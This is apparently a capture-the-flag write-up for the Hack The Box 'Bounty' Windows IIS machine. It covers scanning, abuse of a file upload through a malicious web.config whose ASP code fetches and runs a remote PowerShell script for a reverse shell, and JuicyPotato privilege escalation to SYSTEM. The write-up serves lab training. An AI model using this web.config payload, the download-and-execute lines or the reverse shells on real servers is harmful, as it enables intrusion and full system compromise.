
### Initial access
Port scan
```
80/tcp open  http    Microsoft IIS httpd 7.5                                                                                                                                                                                                
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Bounty
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```
subdomain scan
dirscan
```
┌──(kali㉿kali)-[~/HTB/Bounty]
└─$ 
ffuf -u http://$target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -recursion -recursion-depth 1 -o dirs

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.41.254/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
 :: Output file      : dirs
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

aspnet_client           [Status: 301, Size: 158, Words: 9, Lines: 2, Duration: 89ms]
[INFO] Adding a new job to the queue: http://10.129.41.254/aspnet_client/FUZZ

uploadedfiles           [Status: 301, Size: 158, Words: 9, Lines: 2, Duration: 87ms]
[INFO] Adding a new job to the queue: http://10.129.41.254/uploadedfiles/FUZZ

uploadedFiles           [Status: 301, Size: 158, Words: 9, Lines: 2, Duration: 134ms]
[INFO] Adding a new job to the queue: http://10.129.41.254/uploadedFiles/FUZZ

UploadedFiles           [Status: 301, Size: 158, Words: 9, Lines: 2, Duration: 164ms]
[INFO] Adding a new job to the queue: http://10.129.41.254/UploadedFiles/FUZZ

Aspnet_client           [Status: 301, Size: 158, Words: 9, Lines: 2, Duration: 226ms]
[INFO] Adding a new job to the queue: http://10.129.41.254/Aspnet_client/FUZZ

aspnet_Client           [Status: 301, Size: 158, Words: 9, Lines: 2, Duration: 99ms]
[INFO] Adding a new job to the queue: http://10.129.41.254/aspnet_Client/FUZZ

ASPNET_CLIENT           [Status: 301, Size: 158, Words: 9, Lines: 2, Duration: 117ms]
[INFO] Adding a new job to the queue: http://10.129.41.254/ASPNET_CLIENT/FUZZ

Aspnet_Client           [Status: 301, Size: 158, Words: 9, Lines: 2, Duration: 86ms]
[INFO] Adding a new job to the queue: http://10.129.41.254/Aspnet_Client/FUZZ

[INFO] Starting queued job on target: http://10.129.41.254/aspnet_client/FUZZ

system_web              [Status: 301, Size: 169, Words: 9, Lines: 2, Duration: 93ms]
[WARN] Directory found, but recursion depth exceeded. Ignoring: http://10.129.41.254/aspnet_client/system_web/
[INFO] Starting queued job on target: http://10.129.41.254/uploadedfiles/FUZZ

[INFO] Starting queued job on target: http://10.129.41.254/uploadedFiles/FUZZ

[INFO] Starting queued job on target: http://10.129.41.254/UploadedFiles/FUZZ

[INFO] Starting queued job on target: http://10.129.41.254/Aspnet_client/FUZZ

system_web              [Status: 301, Size: 169, Words: 9, Lines: 2, Duration: 87ms]
[WARN] Directory found, but recursion depth exceeded. Ignoring: http://10.129.41.254/Aspnet_client/system_web/
[INFO] Starting queued job on target: http://10.129.41.254/aspnet_Client/FUZZ

system_web              [Status: 301, Size: 169, Words: 9, Lines: 2, Duration: 84ms]
[WARN] Directory found, but recursion depth exceeded. Ignoring: http://10.129.41.254/aspnet_Client/system_web/
[INFO] Starting queued job on target: http://10.129.41.254/ASPNET_CLIENT/FUZZ

system_web              [Status: 301, Size: 169, Words: 9, Lines: 2, Duration: 84ms]
[WARN] Directory found, but recursion depth exceeded. Ignoring: http://10.129.41.254/ASPNET_CLIENT/system_web/
[INFO] Starting queued job on target: http://10.129.41.254/Aspnet_Client/FUZZ

system_web              [Status: 301, Size: 169, Words: 9, Lines: 2, Duration: 85ms]
[WARN] Directory found, but recursion depth exceeded. Ignoring: http://10.129.41.254/Aspnet_Client/system_web/
:: Progress: [62282/62282] :: Job [9/9] :: 369 req/sec :: Duration: [0:02:31] :: Errors: 46 ::
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/Bounty]
└─$ cat dirs | jq -r '.results[] | [.status, .url] | @tsv' | sort
cat files | jq -r '.results[] | [.status, .url] | @tsv' | sort
301     http://10.129.41.254/aspnet_client
301     http://10.129.41.254/aspnet_Client
301     http://10.129.41.254/Aspnet_client
301     http://10.129.41.254/Aspnet_Client
301     http://10.129.41.254/ASPNET_CLIENT
301     http://10.129.41.254/aspnet_client/system_web
301     http://10.129.41.254/aspnet_Client/system_web
301     http://10.129.41.254/Aspnet_client/system_web
301     http://10.129.41.254/Aspnet_Client/system_web
301     http://10.129.41.254/ASPNET_CLIENT/system_web
301     http://10.129.41.254/uploadedfiles
301     http://10.129.41.254/uploadedFiles
301     http://10.129.41.254/UploadedFiles

```
filescan
```
┌──(kali㉿kali)-[~/HTB/Bounty]
└─$ gobuster dir -u http://$target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x aspx,asp

===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.41.254
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              aspx,asp
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
# license, visit http://creativecommons.org/licenses/by-sa/3.0/.aspx (Status: 400) [Size: 11]
# Suite 300, San Francisco, California, 94105, USA..aspx (Status: 400) [Size: 11]
transfer.aspx        (Status: 200) [Size: 941]
%20.aspx             (Status: 400) [Size: 11]
*checkout*.aspx      (Status: 400) [Size: 11]

```
We have upload in the website in `transfer.aspx`
Brute force extesion using `/usr/share/seclists/Discovery/Web-Content/raft-medium-extensions.txt` in proxy

![[Assets/Pasted image 20260920002927.png]]
So file end with picture  and config is acceptable. But to execute code we have  can use config which is xml. We create web.config and replace it
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%@ Language=VBScript %>
<%
  ' Fileless execution pattern: Code is pulled over the network socket and run in memory
  call Server.CreateObject("WSCRIPT.SHELL").Run("cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.17.47/shell.ps1')")
%>
           


```

We have revshell
```
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/Bounty]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.17.47] from (UNKNOWN) [10.129.41.254] 49158

PS C:\windows\system32\inetsrv> whoami /all

USER INFORMATION
----------------

User Name     SID                                           
============= ==============================================
bounty\merlin S-1-5-21-2239012103-4222820348-3209614936-1000


GROUP INFORMATION
-----------------

Group Name                           Type             SID                                                           Attributes                                        
==================================== ================ ============================================================= ==================================================
Everyone                             Well-known group S-1-1-0                                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545                                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                   Well-known group S-1-5-3                                                       Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1                                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11                                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15                                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568                                                  Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0                                                       Mandatory group, Enabled by default, Enabled group
IIS APPPOOL\DefaultAppPool           Well-known group S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10                                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                  Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
PS C:\windows\system32\inetsrv> 


```

```
C:\Users\merlin\Desktop>dir /a
dir /a
 Volume in drive C has no label.
 Volume Serial Number is 5084-30B0

 Directory of C:\Users\merlin\Desktop

05/31/2018  12:17 AM    <DIR>          .
05/31/2018  12:17 AM    <DIR>          ..
05/30/2018  12:22 AM               282 desktop.ini
09/19/2026  06:50 PM                34 user.txt
               2 File(s)            316 bytes
               2 Dir(s)  11,701,932,032 bytes free

```
### Priv escalation
Run print spooler
```
PS C:\tmp> (New-Object Net.WebClient).DownloadFile("http://10.10.17.47/JuicyPotato.exe.exe", "C:\tmp\JuicyPotato.exe.exe")
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.17.47 LPORT=443 -f exe > shell.exe

PS C:\tmp> PS C:\tmp> (New-Object Net.WebClient).DownloadFile("http://10.10.17.47/shell.exe", "C:\tmp\shell.exe")
PS C:\tmp> .\JuicyPotato.exe -t * -p C:\tmp\shell.exe -l 1337

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

```
┌──(kali㉿kali)-[~/HTB/Bounty]
└─$ rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.17.47] from (UNKNOWN) [10.129.41.254] 49406
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>




```

